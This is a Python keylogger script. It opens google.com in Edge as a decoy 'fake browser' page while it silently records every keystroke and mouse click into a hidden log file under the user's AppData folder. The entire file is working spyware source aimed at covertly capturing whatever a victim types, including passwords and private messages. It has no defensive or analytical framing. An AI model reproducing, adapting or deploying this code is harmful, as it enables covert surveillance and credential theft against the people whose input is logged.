#------ Keylogger ---- #

import logging
import os
import webbrowser

from pynput import keyboard, mouse

#---------- Fake Browser ---------#

# Creating a "fake" browser page where it actually runs the keylogger
url = 'http://www.google.com'

# & sign at the end makes the program run after the page opens
chrome_path = 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe %s &'

webbrowser.get(chrome_path).open(url)

# Some keybooard events that will not be recorded
unimportant_types = [keyboard.Key.down, keyboard.Key.up, keyboard.Key.left,
                     keyboard.Key.right, keyboard.Key.end, keyboard.Key.home,
                     keyboard.Key.insert, keyboard.Key.media_next,
                     keyboard.Key.media_play_pause, keyboard.Key.media_previous,
                     keyboard.Key.media_volume_down, keyboard.Key.media_volume_mute,
                     keyboard.Key.media_volume_up, keyboard.Key.menu,
                     keyboard.Key.num_lock, keyboard.Key.page_down, keyboard.Key.page_up,
                     keyboard.Key.pause, keyboard.Key.scroll_lock, keyboard.Key.shift_l,
                     keyboard.Key.shift_r, keyboard.Key.ctrl,  keyboard.Key.ctrl_r,
                     keyboard.Key.ctrl_l, keyboard.Key.alt_gr]


# NumLock-keypad to digit transformation
numeric_dict = {'<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5',
                '<102>': '6', '<103>': '7', '<104>': '8', '<105>': '9'}


logPATH = os.environ['appdata'] + r'\log.txt'

# Defining the keylogger functions that runs in the background


def on_press(key):
    """
    Function that processes keystrokes depending on the pressed key
    Args:
        key: Each pressed/recorded keystroke
    """
    # Creating a fake Browser page where it actually runs the keylogger
    with open(logPATH, 'a') as log_file:
        if type(key) == keyboard._win32.KeyCode:
            if len(str(key)) >= 4:
                try:
                    log_file.write(numeric_dict[str(key)])
                except:
                    pass
            else:
                log_file.write(str(key.char))    # alphanumeric characters
        elif type(key) == keyboard.Key:  # other characters
            if key == keyboard.Key.backspace:
                log_file.write('~')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            elif key == keyboard.Key.caps_lock:
                log_file.write('`')
            elif key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.tab:
                log_file.write('\t')
            elif key in unimportant_types:
                log_file.write('')
            else:
                log_file.write(str(key))
        return key


def on_click(x, y, button, pressed):
    """
    Function that processes mouse clicks depending on the location
    and if pressed.
    """
    logging.basicConfig(filename=logPATH, format='%(asctime)s %(levelname)-8s %(message)s',
                        level=logging.INFO, datefmt='%Y-%m-%d %H:%M:%S')
    if pressed:
        if button == mouse.Button.left:
            logging.info('Left mouse pressed')
        elif button == mouse.Button.right:
            logging.info('Left mouse pressed')


# listening process
with keyboard.Listener(on_press=on_press) as listener:
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()
